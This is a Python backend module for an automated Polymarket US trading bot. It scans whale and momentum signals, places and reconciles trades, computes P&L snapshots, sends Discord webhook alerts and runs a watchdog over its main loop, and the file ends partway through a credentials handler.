from __future__ import annotations

import asyncio
import io
import json
import logging
import logging.handlers
import os
import random
import sys
import traceback
import us_account_stream
import main_recorder
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


_log_q: asyncio.Queue | None = None


class _StdoutHandler(logging.Handler):

    def emit(self, record: logging.LogRecord) -> None:
        try:
            msg = self.format(record)
        except Exception:
            msg = record.getMessage()
        source = "backend"
        if record.name.startswith("trader"):
            source = "trader"
        elif record.name.startswith("scanner"):
            source = "whale" if "whale" in msg.lower()[:20] else "momentum"
        elif record.name.startswith("webhook") or record.name.startswith("discord"):
            source = "discord"
        try:
            evt = {
                "type": "log",
                "level": record.levelname,
                "source": source,
                "msg": msg,
                "ts": datetime.now(timezone.utc).isoformat(),
            }
            sys.stdout.write(json.dumps(evt) + "\n")
            sys.stdout.flush()
        except Exception:
            pass


def _setup_logging() -> None:
    log_dir_base = os.environ.get("ROM_POLYBOT_USERDATA")
    if log_dir_base:
        log_dir = Path(log_dir_base) / "logs"
    else:
        log_dir = Path(__file__).resolve().parent / "logs"
    log_dir.mkdir(parents=True, exist_ok=True)
    fmt = logging.Formatter(
        "[%(asctime)s] %(levelname)-7s %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    root = logging.getLogger()
    root.setLevel(logging.INFO)
    fh = logging.handlers.RotatingFileHandler(
        log_dir / "backend.log", maxBytes=10 * 1024 * 1024,
        backupCount=5, encoding="utf-8",
    )
    fh.setFormatter(fmt)
    root.addHandler(fh)
    sh = _StdoutHandler()
    sh.setFormatter(fmt)
    root.addHandler(sh)
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("httpcore").setLevel(logging.WARNING)


_setup_logging()
logger = logging.getLogger("service")


import db  # noqa: E402
import polymarket_api  # noqa: E402
import polymarket_auth  # noqa: E402
import scanner  # noqa: E402
import crypto15m  # noqa: E402
import trader  # noqa: E402
import crypto15m_trader  # noqa: E402
import crypto15m_record  # noqa: E402
import activity_ws  # noqa: E402
import copy_trader  # noqa: E402
import script_engine  # noqa: E402
import script_sandbox  # noqa: E402
import rtds_ws  # noqa: E402
import spot_ws  # noqa: E402
import webhook  # noqa: E402
from config import DEFAULT_CONFIG, merge_with_defaults  # noqa: E402


def _iso_utc(s: Any) -> Any:
    if not s:
        return s
    if not isinstance(s, str):
        return s
    s = s.strip()
    if not s:
        return s
    if s.endswith("Z") or "+" in s[10:] or s.count("-") > 2:
        return s.replace(" ", "T")
    return s.replace(" ", "T") + "Z"


class State:
    cfg: dict[str, Any] = dict(DEFAULT_CONFIG)
    auth_ok: bool = False
    paused: bool = False
    last_whale_scan_at: str | None = None
    last_momentum_scan_at: str | None = None
    last_trade_scan_at: str | None = None
    started_at: str = ""
    active_run_id: int = 0
    unredeemed_winnings_usd: float = 0.0
    unredeemed_winnings_count: int = 0
    unredeemed_since: float = 0.0


STATE = State()


_stdout_lock = asyncio.Lock()


async def _send(obj: dict) -> None:
    line = json.dumps(obj, default=str) + "\n"
    async with _stdout_lock:
        sys.stdout.write(line)
        sys.stdout.flush()


async def emit_event(name: str, data: Any = None) -> None:
    await _send({"type": "event", "name": name, "data": data})


async def respond_ok(req_id: str, result: Any = None) -> None:
    await _send({"type": "rpc", "id": req_id, "ok": True, "result": result})


async def respond_err(req_id: str, msg: str) -> None:
    await _send({"type": "rpc", "id": req_id, "ok": False, "error": msg})


async def _build_account_snapshot() -> dict:
    env = polymarket_auth.get_env()
    cash_cents = port_cents = 0
    try:
        cents, port = await trader.refresh_balance(STATE.cfg, force=False)
        cash_cents = cents
        port_cents = port
    except Exception:
        pass
    cash_usd = cash_cents / 100.0
    port_usd = port_cents / 100.0
    total = cash_usd + port_usd

    user_start = float(STATE.cfg.get("start_bankroll_usd", 0.0) or 0.0)
    if user_start > 0:
        baseline = user_start
        baseline_source = "user"
    else:
        with db.get_db() as conn:
            earliest = db.earliest_pnl_total(conn, env)
        if earliest and earliest > 0:
            baseline = earliest
            baseline_source = "auto"
        else:
            baseline = total if total > 0 else 0.0
            baseline_source = "live"

    with db.get_db() as conn:
        stats_env = db.aggregate_stats(conn, env)
        balance_syncing = db.recent_balance_transition(conn, env)
    wl = stats_env["wins"] + stats_env["losses"]
    wr = (stats_env["wins"] / wl * 100.0) if wl else 0.0
    open_cost = stats_env["open_cost"]
    unrealized = port_usd - open_cost

    day_off = trader.trading_day_offset_min(STATE.cfg)
    with db.get_db() as conn:
        first_today = db.first_snapshot_of_today(conn, env, day_off)
        bankroll_baseline_snap = db.earliest_pnl_total(conn, env)
        active_run = db.get_active_run(conn, env) if STATE.active_run_id else None
        today_transfers = db.transfer_adjustment_today(conn, env, day_off)
        alltime_transfers = db.transfer_adjustment_total(conn, env)
        session_transfers = (
            db.transfer_adjustment_run(conn, env, int(active_run.get("id") or 0))
            if active_run else 0.0
        )

    today_balance_baseline = (
        float(first_today["total_usd"]) if first_today else None
    )
    today_balance_pnl = (
        total - today_balance_baseline - today_transfers
        if today_balance_baseline is not None else 0.0
    )
    alltime_balance_baseline = (
        float(bankroll_baseline_snap)
        if bankroll_baseline_snap is not None else baseline
    )
    alltime_balance_pnl = total - alltime_balance_baseline - alltime_transfers
    roi = (
        (alltime_balance_pnl / alltime_balance_baseline * 100.0)
        if alltime_balance_baseline > 0 else 0.0
    )

    if active_run:
        session_baseline = float(active_run.get("start_total_usd") or 0.0)
        session_started_at = _iso_utc(
            active_run.get("started_at") or STATE.started_at
        )
        session_run_id = int(active_run.get("id") or 0)
    else:
        session_baseline = total
        session_started_at = STATE.started_at
        session_run_id = 0
    session_pnl = (
        total - session_baseline - session_transfers
        if session_baseline > 0 else 0.0
    )
    session_roi = (
        (session_pnl / session_baseline * 100.0)
        if session_baseline > 0 else 0.0
    )

    return {
        "cashUsd": cash_usd,
        "portfolioUsd": port_usd,
        "totalUsd": total,
        "balanceSyncing": balance_syncing,
        "tradingGeoblocked": polymarket_api.geoblock_active(),
        "startBankrollUsd": baseline,
        "bankrollSource": baseline_source,
        "roiPct": roi,
        "realizedPnlUsd": stats_env["realized_pnl"],
        "todayPnlUsd": today_balance_pnl,
        "alltimePnlUsd": alltime_balance_pnl,
        "todayBaselineUsd": today_balance_baseline,
        "alltimeBaselineUsd": alltime_balance_baseline,
        "sessionPnlUsd": session_pnl,
        "sessionRoiPct": session_roi,
        "sessionBaselineUsd": session_baseline,
        "sessionStartedAt": session_started_at,
        "sessionRunId": session_run_id,
        "todayWins": stats_env["today_wins"],
        "todayLosses": stats_env["today_losses"],
        "unrealizedPnlUsd": unrealized,
        "openCostUsd": open_cost,
        "unredeemedWinningsUsd": STATE.unredeemed_winnings_usd,
        "unredeemedWinningsCount": STATE.unredeemed_winnings_count,
        "unredeemedWinningsStale": bool(
            STATE.unredeemed_since
            and STATE.unredeemed_winnings_usd >= 1.0
            and (asyncio.get_event_loop().time() - STATE.unredeemed_since) >= 300.0
        ),
        "feesUsd": stats_env["fees"],
        "wins": stats_env["wins"],
        "losses": stats_env["losses"],
        "winRate": wr,
        "pendingCount": stats_env["pending"],
        "openCount": stats_env["open_filled"],
        "resolvedCount": stats_env["resolved_count"],
        "totalOpened": stats_env["total_opened"],
        "byNetwork": {
            "mainnet": {
                "wins": stats_env["wins"],
                "losses": stats_env["losses"],
                "realizedPnl": stats_env["realized_pnl"],
            },
        },
    }


def _live_pnl_usd(r: dict) -> float | None:
    if r.get("resolved"):
        return None
    mark = r.get("mark_price_cents")
    if mark is None:
        return None
    filled = int(r.get("filled_contracts") or 0)
    if filled <= 0:
        return None
    market_value = filled * float(mark) / 100.0
    return round(market_value - float(r.get("cost_usd") or 0.0), 2)


def _position_row_to_js(r: dict) -> dict:
    return {
        "id": int(r["id"]),
        "signalSource": r["signal_source"],
        "signalId": int(r["signal_id"]),
        "ticker": r["ticker"],
        "eventTicker": r.get("event_ticker") or "",
        "title": r.get("title") or "",
        "category": r.get("category") or "",
        "direction": r["direction"],
        "action": r.get("action") or "buy",
        "targetContracts": int(r.get("target_contracts") or 0),
        "limitPriceCents": int(r.get("limit_price_cents") or 0),
        "filledContracts": int(r.get("filled_contracts") or 0),
        "avgFillPriceCents": (
            float(r["avg_fill_price_cents"])
            if r.get("avg_fill_price_cents") is not None
            else None
        ),
        "costUsd": float(r.get("cost_usd") or 0),
        "feesUsd": float(r.get("fees_usd") or 0),
        "clientOrderId": r.get("client_order_id") or "",
        "orderId": r.get("order_id"),
        "status": r["status"],
        "confidence": float(r.get("confidence") or 0),
        "edgePts": float(r.get("edge_pts") or 0),
        "signalPriceCents": float(r.get("signal_price") or 0),
        "resolved": bool(r.get("resolved") or 0),
        "outcomeCorrect": (
            int(r["outcome_correct"])
            if r.get("outcome_correct") is not None
            else None
        ),
        "settlementUsd": (
            float(r["settlement_usd"])
            if r.get("settlement_usd") is not None
            else None
        ),
        "pnlUsd": float(r["pnl_usd"]) if r.get("pnl_usd") is not None else None,
        "markPriceCents": (
            float(r["mark_price_cents"])
            if r.get("mark_price_cents") is not None
            else None
        ),
        "livePnlUsd": _live_pnl_usd(r),
        "balanceBeforeUsd": (
            float(r["balance_before_usd"])
            if r.get("balance_before_usd") is not None
            else None
        ),
        "network": r.get("network") or "mainnet",
        "createdAt": _iso_utc(r.get("created_at")) or "",
        "lastUpdated": _iso_utc(r.get("last_updated")) or "",
        "resolvedAt": _iso_utc(r.get("resolved_at")),
        "error": r.get("error"),
    }


def _signal_row_to_js(r: dict, source: str, traded: bool) -> dict:
    if source == "whale":
        price_frac = float(r.get("price") or 0)
        price_c = int(round(price_frac * 100))
        return {
            "id": int(r["id"]),
            "source": "whale",
            "ticker": r["ticker"],
            "eventTicker": r.get("event_ticker") or "",
            "title": r.get("title") or r.get("ticker", ""),
            "category": r.get("category") or "",
            "direction": (r.get("taker_side") or "yes").lower(),
            "priceCents": price_c,
            "confidence": float(r.get("confidence") or 0),
            "edgePts": float(r.get("confidence") or 0) - price_c,
            "dollarValue": float(r.get("dollar_value") or 0),
            "createdAt": _iso_utc(r.get("created_at")) or "",
            "resolved": bool(r.get("resolved") or 0),
            "outcomeCorrect": (
                int(r["outcome_correct"])
                if r.get("outcome_correct") is not None
                else None
            ),
            "pnlEstimate": (
                float(r["pnl_estimate"])
                if r.get("pnl_estimate") is not None
                else None
            ),
            "traded": traded,
        }
    direction = (r.get("direction") or "yes").lower()
    price_frac = float(r.get("price") or 0)
    yes_c = int(round(price_frac * 100))
    cost_c = yes_c if direction == "yes" else max(0, 100 - yes_c)
    implied = yes_c if direction == "yes" else 100 - yes_c
    return {
        "id": int(r["id"]),
        "source": "momentum",
        "ticker": r["ticker"],
        "eventTicker": r.get("event_ticker") or "",
        "title": r.get("title") or r.get("ticker", ""),
        "category": r.get("category") or "",
        "direction": direction,
        "priceCents": cost_c,
        "confidence": float(r.get("confidence") or 0),
        "edgePts": float(r.get("confidence") or 0) - implied,
        "signalType": r.get("signal_type") or "",
        "createdAt": _iso_utc(r.get("created_at")) or "",
        "resolved": bool(r.get("resolved") or 0),
        "outcomeCorrect": (
            int(r["outcome_correct"])
            if r.get("outcome_correct") is not None
            else None
        ),
        "pnlEstimate": (
            float(r["pnl_estimate"])
            if r.get("pnl_estimate") is not None
            else None
        ),
        "traded": traded,
    }


_loop_task: asyncio.Task | None = None
_loop_stop: asyncio.Event | None = None
_watchdog_task: asyncio.Task | None = None
_loop_heartbeat: float = 0.0
_LOOP_STALL_SEC = 240.0
_WATCHDOG_CHECK_SEC = 20.0

_bg_tasks: set[asyncio.Task] = set()


def _fire_and_forget(coro) -> None:
    async def _quiet():
        try:
            await coro
        except Exception:
            pass
    try:
        t = asyncio.get_event_loop().create_task(_quiet())
    except RuntimeError:
        return
    _bg_tasks.add(t)
    t.add_done_callback(_bg_tasks.discard)

_event_webhook_last: dict[int, str] = {}
_EVENT_WEBHOOK_MAX = 2000


def _should_fire_event_webhook(pos_id: int, kind: str) -> bool:
    if not pos_id:
        return True
    if _event_webhook_last.get(pos_id) == kind:
        return False
    _event_webhook_last[pos_id] = kind
    if len(_event_webhook_last) > _EVENT_WEBHOOK_MAX:
        for _k in list(_event_webhook_last.keys())[: len(_event_webhook_last) - _EVENT_WEBHOOK_MAX]:
            _event_webhook_last.pop(_k, None)
    return True


async def _on_crypto15m_auto_off(info: dict) -> None:
    try:
        STATE.cfg["crypto15m_enabled"] = False
    except Exception:
        pass
    gained = float(info.get("gained") or 0.0)
    target = float(info.get("target") or 0.0)
    logger.info(
        f"crypto15m overall take-profit hit (gained ${gained:+.2f} >= "
        f"${target:.2f}); engine turned OFF"
    )
    await emit_event("crypto15m:autoOff", {
        "reason": info.get("reason") or "take_profit_total",
        "gained": gained,
        "target": target,
    })
    try:
        await emit_event("account:update", await _build_account_snapshot())
    except Exception:
        pass


async def _scanner_and_trader_loop() -> None:
    global _loop_heartbeat
    _loop_heartbeat = asyncio.get_event_loop().time()
    last_whale = 0.0
    last_momentum = 0.0
    last_trade = 0.0
    last_poll = 0.0
    last_resolve = 0.0
    last_market_sync = 0.0
    last_event_sync = 0.0
    last_account_emit = 0.0
    last_pnl_persist = 0.0
    last_reconcile = 0.0
    last_external_exits = 0.0
    last_tp_sweep = 0.0
    last_auth_retry = 0.0
    last_crypto15m = 0.0
    last_crypto15m_record = 0.0
    last_copy = 0.0
    copy_hot_until = 0.0
    last_script = 0.0
    last_redeem_check = 0.0
    last_cleanup = 0.0
    last_stats_push = asyncio.get_event_loop().time()

    try:
        cnt = await scanner.sync_markets(max_pages=10)
        logger.info(f"Initial market sync: {cnt} markets")
    except Exception as e:
        logger.warning(f"initial market sync failed: {e}")


    while not (_loop_stop and _loop_stop.is_set()):
        now = asyncio.get_event_loop().time()
        _loop_heartbeat = now
        cfg = STATE.cfg

        if STATE.paused:
            await asyncio.sleep(1)
            continue

        try:
            if (
                not STATE.auth_ok
                and polymarket_auth.credentials_present()
                and now - last_auth_retry >= 15
            ):
                last_auth_retry = now
                if await _establish_auth(retries=1):
                    STATE.auth_ok = True
                    logger.info("auth recovered (was transiently disconnected)")
                    await emit_event("backend:authChanged", {"authOk": True})
        except Exception as e:
            logger.debug(f"auth self-heal failed: {e}")

        try:
            if now - last_market_sync >= float(cfg.get("market_refresh_interval", 300)):
                await scanner.sync_markets(max_pages=10)
                last_market_sync = now
            if now - last_event_sync >= 600:
                await scanner.sync_events()
                last_event_sync = now
        except Exception as e:
            logger.warning(f"sync error: {e}")

        collect_main = (bool(cfg.get("main_record_signals", True))
                        or bool(cfg.get("enable_trading"))
                        or bool(cfg.get("main_paper_trading"))
                        or script_engine.needs_signal_feed())
        main_recorder.configure(collect_main)
        try:
            await asyncio.to_thread(main_recorder.flush)
        except Exception as exc:
            logger.warning('Main replay recording gap: %s',type(exc).__name__)

        try:
            if collect_main and now - last_whale >= float(cfg.get("whale_scan_interval", 120)):
                cnt, rows = await scanner.scan_whales(cfg)
                last_whale = now
                STATE.last_whale_scan_at = datetime.now(timezone.utc).isoformat()
                if cnt:
                    logger.info(f"whale scan: {cnt} new")
                with db.get_db() as conn:
                    seen = db.already_traded_signal_ids(
                        conn, "whale", polymarket_auth.get_env()
                    )
                for row in rows:
                    main_recorder.signal(row,'whale',cfg)
                    js = _signal_row_to_js(row, "whale", int(row["id"]) in seen)
                    await emit_event("signal:new", js)
                    if cfg.get("enable_discord") and row.get("status") != "dry_run":
                        _fire_and_forget(webhook.send_whale(
                            cfg.get("whale_webhook_url", ""), row
                        ))
        except Exception as e:
            logger.warning(f"whale scan error: {e}")

        try:
            if collect_main and now - last_momentum >= float(cfg.get("momentum_scan_interval", 90)):
                cnt, rows = await scanner.scan_momentum(cfg)
                last_momentum = now
                STATE.last_momentum_scan_at = datetime.now(timezone.utc).isoformat()
                if cnt:
                    logger.info(f"momentum scan: {cnt} new")
                with db.get_db() as conn:
                    seen = db.already_traded_signal_ids(
                        conn, "momentum", polymarket_auth.get_env()
                    )
                for row in rows:
                    main_recorder.signal(row,'momentum',cfg)
                    js = _signal_row_to_js(row, "momentum", int(row["id"]) in seen)
                    await emit_event("signal:new", js)
                    if cfg.get("enable_discord"):
                        _fire_and_forget(webhook.send_momentum(
                            cfg.get("momentum_webhook_url", ""), row
                        ))
        except Exception as e:
            logger.warning(f"momentum scan error: {e}")

        try:
            if (
                STATE.auth_ok
                and (cfg.get("enable_trading") or cfg.get("main_paper_trading"))
                and now - last_trade >= float(cfg.get("trade_scan_interval", 20))
            ):
                placed = await trader.scan_for_trades(cfg)
                last_trade = now
                STATE.last_trade_scan_at = datetime.now(timezone.utc).isoformat()
                for row in placed:
                    js = _position_row_to_js(row)
                    await emit_event("position:new", js)
                    if (
                        row.get("status") != "dry_run"
                        and
                        cfg.get("enable_discord")
                        and _should_fire_event_webhook(int(row.get("id") or 0), "placed")
                    ):
                        _fire_and_forget(webhook.send_event(
                            cfg.get("event_webhook_url", ""),
                            "placed", row, polymarket_auth.get_env(),
                        ))
        except Exception as e:
            logger.error(f"trade scan error: {e}", exc_info=True)

        try:
            us_account_stream.start()
            account_changed = us_account_stream.consume_dirty()
            if (
                STATE.auth_ok
                and (account_changed or now - last_poll >= float(cfg.get("position_poll_interval", 30)))
            ):
                updated = await trader.poll_open_orders(cfg)
                last_poll = now
                if account_changed or any(r.get("status") in ("filled", "partial") for r in updated):
                    last_reconcile = 0.0
                    try:
                        await trader.refresh_balance(cfg, force=True)
                        await emit_event("account:update", await _build_account_snapshot())
                    except Exception as e:
                        logger.debug(f"post-fill balance refresh failed: {e}")
                for row in updated:
                    js = _position_row_to_js(row)
                    await emit_event("position:update", js)
                    if cfg.get("enable_discord") and row.get("status") != "dry_run":
                        kind = row["status"]
                        if (
                            kind in ("filled", "partial", "canceled", "gone", "error")
                            and _should_fire_event_webhook(
                                int(row.get("id") or 0), kind
                            )
                        ):
                            _fire_and_forget(webhook.send_event(
                                cfg.get("event_webhook_url", ""),
                                kind, row, polymarket_auth.get_env(),
                            ))
        except Exception as e:
            logger.error(f"poll error: {e}", exc_info=True)

        try:
            if STATE.auth_ok and now - last_redeem_check >= 180.0:
                last_redeem_check = now
                settled = await polymarket_api.get_settled_positions()
                total = sum(
                    abs(float(p.get("position_fp") or 0)) * float(p.get("cur_price") or 0)
                    for p in settled
                )
                STATE.unredeemed_winnings_usd = round(total, 2)
                STATE.unredeemed_winnings_count = len(settled)
                if total >= 1.0:
                    if not STATE.unredeemed_since:
                        STATE.unredeemed_since = now
                else:
                    STATE.unredeemed_since = 0.0
        except Exception as e:
            logger.debug(f"unredeemed-winnings check failed: {e}")

        try:
            if STATE.auth_ok and now - last_reconcile >= 30:
                summary, changed = await trader.reconcile_positions_with_polymarket()
                last_reconcile = now
                if any(summary.values()):
                    logger.info(f"reconcile: {summary}")
                    await emit_event("backend:reconciled", summary)
                for row in changed:
                    await emit_event(
                        "position:update", _position_row_to_js(row),
                    )
        except Exception as e:
            logger.debug(f"periodic reconcile failed: {e}")

        try:
            if STATE.auth_ok and now - last_external_exits >= 600:
                last_external_exits = now
                ext_rows = await trader.detect_external_exits(cfg)
                for row in ext_rows:
                    await emit_event("position:update", _position_row_to_js(row))
                if ext_rows:
                    logger.info(f"external exits: booked {len(ext_rows)} position(s)")
        except Exception as e:
            logger.debug(f"periodic external-exit sweep failed: {e}")

        try:
            if STATE.auth_ok and now - last_tp_sweep >= 30:
                last_tp_sweep = now
                tp_rows = await trader.take_profit_sweep(cfg)
                for row in tp_rows:
                    await emit_event("position:update", _position_row_to_js(row))
                if tp_rows:
                    logger.info(f"take-profit: cashed out {len(tp_rows)} position(s)")
        except Exception as e:
            logger.debug(f"periodic take-profit sweep failed: {e}")

        try:
            if (
                STATE.auth_ok
                and now - last_resolve >= float(cfg.get("resolution_check_interval", 300))
            ):
                resolved_pos = await trader.mark_resolved_positions(cfg)
                await scanner.resolve_alerts_from_markets()
                await scanner.resolve_whales_from_markets()
                last_resolve = now
                for row in resolved_pos:
                    js = _position_row_to_js(row)
                    await emit_event("position:update", js)
                    if cfg.get("enable_discord") and row.get("status") != "dry_run":
                        kind = "won" if row.get("outcome_correct") == 1 else (
                            "lost" if row.get("outcome_correct") == 0 else "na"
                        )
                        if _should_fire_event_webhook(
                            int(row.get("id") or 0), kind
                        ):
                            _fire_and_forget(webhook.send_event(
                                cfg.get("event_webhook_url", ""),
                                kind, row, polymarket_auth.get_env(),
                            ))
        except Exception as e:
            logger.error(f"resolution error: {e}", exc_info=True)

        try:
            if (
                STATE.auth_ok
                and now - last_crypto15m >= float(cfg.get("crypto15m_poll_sec", 4))
            ):
                changed = await crypto15m_trader.run_tick(cfg, authed=STATE.auth_ok)
                last_crypto15m = now
                if changed:
                    _fire_and_forget(trader.refresh_balance(cfg, force=True))
        except Exception as e:
            logger.error(f"crypto15m tick error: {e}", exc_info=True)

        try:
            if bool(cfg.get("crypto15m_spot_ws", True)):
                if not spot_ws.is_running():
                    spot_ws.start()
            elif spot_ws.is_running():
                await spot_ws.stop()
        except Exception as e:
            logger.debug(f"spot_ws lifecycle: {e}")
        try:
            if False:  # International RTDS is not a Polymarket US feed.
                if not rtds_ws.is_running():
                    rtds_ws.start()
            elif rtds_ws.is_running():
                await rtds_ws.stop()
        except Exception as e:
            logger.debug(f"rtds_ws lifecycle: {e}")

        # ── User-script executor (Scripts tab) ────────────────────
        try:
            if (
                STATE.auth_ok
                and now - last_script >= float(cfg.get("script_poll_sec", 5))
            ):
                await script_engine.run_tick(cfg, authed=STATE.auth_ok)
                last_script = now
        except Exception as e:
            logger.error(f"script engine tick error: {e}", exc_info=True)

        # ── Copy-trading executor (Phase 3) ───────────────────────
        try:
            copy_on = bool(cfg.get("copy_enabled")) and bool(cfg.get("copy_wallets") or [])
            try:
                if copy_on and bool(cfg.get("copy_activity_ws", True)):
                    if not activity_ws.is_running():
                        activity_ws.start()
                    activity_ws.set_watch(cfg.get("copy_wallets") or [])
                elif activity_ws.is_running():
                    await activity_ws.stop()
            except Exception as e:
                logger.debug(f"activity_ws lifecycle: {e}")

            base_iv = float(cfg.get("copy_poll_sec", 30))
            fast_iv = float(cfg.get("copy_fast_poll_sec", 5))
            if activity_ws.has_hits():
                hits = activity_ws.drain_hits()
                copy_hot_until = now + 45.0
                sells = sum(1 for h in hits if h.get("side") == "SELL")
                logger.info(
                    f"[copy] activity push: {len(hits)} trade(s) by followed "
                    f"wallets ({sells} sell) — ticking now"
                )
                due = now - last_copy >= 1.0
            else:
                iv = base_iv
                if copy_trader.last_open_count > 0 or now < copy_hot_until:
                    iv = min(base_iv, fast_iv)
                due = now - last_copy >= iv
            if copy_on and due:
                copy_changed = await copy_trader.run_tick(cfg, authed=STATE.auth_ok)
                for row in copy_changed:
                    await emit_event("position:update", _position_row_to_js(row))
                last_copy = now
        except Exception as e:
            logger.error(f"copy tick error: {e}", exc_info=True)

        try:
            if (
                cfg.get("crypto15m_record_signals", True)
                and now - last_crypto15m_record >= 25
            ):
                await crypto15m_record.record_tick(cfg)
                last_crypto15m_record = now
        except Exception as e:
            logger.debug(f"crypto15m record error: {e}")

        try:
            if now - last_cleanup >= float(cfg.get("db_cleanup_interval", 3600)):
                summary = await asyncio.get_event_loop().run_in_executor(
                    None, db.run_maintenance
                )
                if summary.get("deleted") or summary.get("vacuumed"):
                    logger.info(
                        f"db maintenance: pruned {summary['deleted']} rows, "
                        f"vacuumed={summary['vacuumed']} "
                        f"(reclaimable {summary['reclaimable_mb']}MB)"
                    )
                last_cleanup = now
        except Exception as e:
            logger.warning(f"db maintenance failed: {e}")

        try:
            if now - last_account_emit >= 15:
                snap = await _build_account_snapshot()
                if STATE.auth_ok:
                    with db.get_db() as conn:
                        if now - last_pnl_persist >= 60:
                            try:
                                moved = db.note_transfer_if_unexplainable(
                                    conn,
                                    polymarket_auth.get_env(),
                                    snap["totalUsd"],
                                    run_id=int(STATE.active_run_id or 0),
                                    offset_min=trader.trading_day_offset_min(cfg),
                                )
                                if moved:
                                    kind = "deposit" if moved > 0 else "withdrawal"
                                    logger.warning(
                                        f"[balance] {kind} of ${abs(moved):.2f} detected — "
                                        "excluded from today/session/all-time P&L "
                                        "and the daily stop"
                                    )
                            except Exception as e:
                                logger.debug(f"transfer detection failed: {e}")
                            db.insert_pnl_snapshot(
                                conn,
                                cash_usd=snap["cashUsd"],
                                portfolio_usd=snap["portfolioUsd"],
                                realized_pnl_usd=snap["realizedPnlUsd"],
                                wins=snap["wins"], losses=snap["losses"],
                                open_positions=snap["openCount"] + snap["pendingCount"],
                                env=polymarket_auth.get_env(),
                            )
                            last_pnl_persist = now
                        if STATE.active_run_id:
                            db.heartbeat_bot_run(
                                conn, STATE.active_run_id,
                                cash_usd=snap["cashUsd"],
                                portfolio_usd=snap["portfolioUsd"],
                                lifetime_trades=snap["totalOpened"],
                                lifetime_wins=snap["wins"],
                                lifetime_losses=snap["losses"],
                            )
                await emit_event("account:update", snap)
                last_account_emit = now
        except Exception as e:
            logger.debug(f"account snapshot error: {e}")

        try:
            push_iv = float(cfg.get("stats_push_interval", 3600) or 3600)
            if (
                cfg.get("enable_discord")
                and cfg.get("stats_webhook_url")
                and now - last_stats_push >= push_iv
            ):
                snap_for_stats = await _build_account_snapshot()
                try:
                    await webhook.send_stats(
                        cfg.get("stats_webhook_url", ""),
                        snap_for_stats,
                        polymarket_auth.get_env(),
                    )
                    logger.info(
                        f"stats webhook fired (next in "
                        f"{int(push_iv // 60)}m)"
                    )
                except Exception as e:
                    logger.debug(f"stats webhook send failed: {e}")
                last_stats_push = now
        except Exception as e:
            logger.debug(f"stats webhook scheduler error: {e}")

        await asyncio.sleep(1)


async def _start_loop() -> None:
    global _loop_task, _loop_stop, _watchdog_task
    if _loop_task and not _loop_task.done():
        return
    _loop_stop = asyncio.Event()
    _loop_task = asyncio.create_task(_scanner_and_trader_loop())
    if not _watchdog_task or _watchdog_task.done():
        _watchdog_task = asyncio.create_task(_loop_watchdog())


async def _stop_loop() -> None:
    global _loop_task, _loop_stop, _watchdog_task
    await us_account_stream.stop()
    if _loop_stop:
        _loop_stop.set()
    if _watchdog_task:
        _watchdog_task.cancel()
        try:
            await asyncio.wait_for(_watchdog_task, timeout=5)
        except Exception:
            pass
        _watchdog_task = None
    if _loop_task:
        try:
            await asyncio.wait_for(_loop_task, timeout=5)
        except Exception:
            pass


async def _loop_watchdog() -> None:
    global _loop_task
    while not (_loop_stop and _loop_stop.is_set()):
        try:
            await asyncio.sleep(_WATCHDOG_CHECK_SEC)
        except asyncio.CancelledError:
            break
        if _loop_stop and _loop_stop.is_set():
            break
        task = _loop_task
        if not task:
            continue
        if task.done():
            try:
                _exc = task.exception()
            except BaseException:
                _exc = None
            logger.critical(
                f"trading loop task ended unexpectedly ({_exc!r}) — restarting it"
            )
        else:
            if _loop_heartbeat <= 0:
                continue
            stalled = asyncio.get_event_loop().time() - _loop_heartbeat
            if stalled < _LOOP_STALL_SEC:
                continue
            logger.critical(
                f"trading loop stalled {stalled:.0f}s with no heartbeat — restarting it"
            )
            try:
                await emit_event("backend:loopStalled", {"stalledSec": round(stalled)})
            except Exception:
                pass
            task.cancel()
            try:
                await asyncio.wait_for(task, timeout=10)
            except BaseException:
                pass
        if _loop_stop and _loop_stop.is_set():
            break
        for _name, _mod in (("polymarket_api", polymarket_api), ("crypto15m", crypto15m)):
            try:
                await _mod.close_clients()
            except Exception as e:
                logger.debug(f"watchdog client recycle ({_name}) failed: {e}")
        _loop_task = asyncio.create_task(_scanner_and_trader_loop())
        logger.info("trading loop restarted by watchdog (HTTP clients recycled)")


async def _h_ping(_p: dict) -> dict:
    return {"pong": True, "ts": datetime.now(timezone.utc).isoformat()}


async def _h_setConfig(p: dict) -> dict:
    incoming = p.get("config", p)
    if incoming.get("copyEnabled") or incoming.get("copy_enabled"):
        raise ValueError("Wallet copy trading is not available on Polymarket US")
    cfg = merge_with_defaults(p.get("config") or {})
    STATE.cfg = cfg
    logger.info(
        f"setConfig applied: enable_trading={cfg.get('enable_trading')} "
        f"crypto15m={cfg.get('crypto15m_enabled')} copy={cfg.get('copy_enabled')} "
        f"trade_whales={cfg.get('trade_whales')} "
        f"trade_momentum={cfg.get('trade_momentum')} "
        f"max_open={cfg.get('max_open_positions')} "
        f"max_daily="
        f"{'∞' if cfg.get('unlimited_daily_new_positions') else cfg.get('max_daily_new_positions')} "
        f"stop_loss={cfg.get('stop_loss_on_day')} "
        f"env={cfg.get('network')}"
    )
    new_env = cfg.get("network", "mainnet")
    prev_env = polymarket_auth.get_env()
    polymarket_auth.set_env(new_env)

    if new_env != prev_env:
        polymarket_auth.reset_credential_cache()
        if polymarket_auth.credentials_present(new_env):
            STATE.auth_ok = await _establish_auth()
        else:
            STATE.auth_ok = False
        await emit_event("backend:authChanged", {"authOk": STATE.auth_ok})

        try:
            if STATE.active_run_id:
                with db.get_db() as conn:
                    db.end_bot_run(conn, STATE.active_run_id)
                STATE.active_run_id = 0
            if STATE.auth_ok:
                cents, port = await trader.refresh_balance(STATE.cfg, force=True)
                with db.get_db() as conn:
                    stats = db.aggregate_stats(conn, new_env)
                    STATE.active_run_id = db.start_bot_run(
                        conn, env=new_env,
                        cash_usd=cents / 100.0,
                        portfolio_usd=port / 100.0,
                        lifetime_trades=int(stats.get("total_opened") or 0),
                        lifetime_wins=int(stats.get("wins") or 0),
                        lifetime_losses=int(stats.get("losses") or 0),
                    )
                logger.info(
                    f"Bot run #{STATE.active_run_id} started after env switch "
                    f"(env={new_env})"
                )
        except Exception as e:
            logger.warning(f"could not roll bot_run on env switch: {e}")
    return {"ok": True}


async def _h_setCredentials(p: dict) -> dict:
    p = p or {}
    env = p.get("env")
    await polymarket_api.close_clients()
    STATE.auth_ok = False
    polymarket_auth.save_credentials(p.get("keyId", ""), p.get("secretKey", ""), env)
    try:
